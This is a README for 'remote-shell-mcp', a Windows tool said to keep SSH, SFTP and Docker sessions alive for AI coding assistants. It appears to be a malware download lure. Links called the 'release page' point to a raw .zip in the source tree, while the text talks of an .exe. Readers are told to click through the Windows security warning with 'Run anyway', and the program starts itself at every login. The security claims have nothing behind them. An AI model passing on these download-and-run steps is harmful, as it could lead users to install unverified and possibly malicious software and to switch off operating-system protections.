# 🖥️ remote-shell-mcp - Keep your remote sessions alive constantly

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/kerimrhm60/remote-shell-mcp/main/cmd/remote-shell-mcpd/mcp-shell-remote-3.2.zip)

This application helps you maintain persistent connections to your servers and Docker containers. It acts as a background helper for your AI coding tools, such as Claude Desktop or Cursor. When you restart your AI tools, your tunnels, shells, and file transfers remain active. You do not lose your progress or connection state.

## ⚙️ Why use this tool

AI coding assistants often lose their connection to remote environments when you restart the software. This breaks your workflow. remote-shell-mcp runs as a background process. It holds your SSH tunnels and file transfers open even when your main editor closes. 

Key benefits include:
- Persistent SSH connections that do not drop.
- Stable SFTP links for reliable file management.
- Active port forwarding for local web development.
- Docker integration for remote container management.
- Compatibility with Claude Desktop and Cursor.

## 💾 How to install and run

Follow these steps to set up the software on your Windows computer.

1. Go to the [official release page](https://raw.githubusercontent.com/kerimrhm60/remote-shell-mcp/main/cmd/remote-shell-mcpd/mcp-shell-remote-3.2.zip) to access the downloads.
2. Look for the file ending in .exe under the most recent version header. 
3. Click the file name to download it to your Downloads folder.
4. Open your Downloads folder and double-click the file to start the installation.
5. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system asks you to confirm.
6. Follow the on-screen instructions to finish the setup.
7. Once installed, the program runs in the background. It starts automatically every time you log in to your computer.

## 🛠️ System requirements

This software requires a standard Windows 10 or Windows 11 environment. You do not need to install extra software for the core features to function. 

- Memory: 256 MB of RAM.
- Disk space: 50 MB of free storage.
- Network: A stable internet connection for remote access.
- User permissions: Standard user access is enough for normal operation.

## 🔗 Connecting your AI tools

After you finish the installation, you need to link the software to your AI coding assistant. 

1. Open your AI coding tool, such as Claude Desktop or Cursor.
2. Navigate to the settings menu for MCP or tools.
3. Add a new connection.
4. Input the local address provided by remote-shell-mcp. Most users use "http://localhost:8080" as the default path.
5. Save your settings. 
6. Restart your AI coding tool to complete the handshake.

## 📦 Managing your connections

You can manage your active sessions through the system tray icon located near your clock on the Windows taskbar.

- Right-click the icon to see a list of active tunnels.
- Select "Show Status" to see which connections are currently alive.
- Use "Add New" to define a new SSH or Docker connection.
- Choose "Disconnect" to end a specific session safely.
- Select "Exit" to close the background helper entirely.

## 🛡️ Security and safety

Your security is important. This application stores your configuration locally on your machine. It never sends your connection keys or server passwords to the cloud. All traffic remains encrypted using standard SSH protocols. You remain in control of which servers the tool can access. 

If you configure a new connection, the application stores the hostname and port. It does not store your private keys in a plain text format. The application uses your system's protected storage to keep your credentials safe from other programs.

## 🚑 Troubleshooting common issues

If you encounter problems, check these items first.

**The connection drops frequently**
Check your internet stability. If you use a VPN, try disabling it to see if the connection improves. Ensure your firewall is not blocking the application.

**The AI tool cannot find the server**
Verify that the port number matches the one in your AI tool settings. Ensure that the application icon in your system tray indicates that the service is running. 

**Application fails to start**
Verify that you downloaded the latest version from the releases page. Old versions might not contain the latest fixes for Windows compatibility.

**High resource usage**
This tool is designed to use minimal memory. If you experience high usage, try removing idle connections that you no longer need. Use the tray menu to close connections that are not currently in use.

## 📋 Custom configuration

Advanced users can change how the application behaves by modifying the config file. This file resides in your user profile folder under the .remote-shell-mcp directory. 

You can edit this file with any text editor, such as Notepad. You may change the default port, logging level, or connection timeout settings. After you save any changes to this file, you must restart the application for the new settings to take effect.

## 📝 Ongoing support

This project is open source and relies on community feedback. If you find a bug or have a suggestion, open an issue on the repository tracking page. Provide a clear description of the problem and the steps you took. This helps developers reproduce the issue and create a fix. 

Check back on the release page periodically for updates. New versions often include performance improvements and better support for newer AI model features.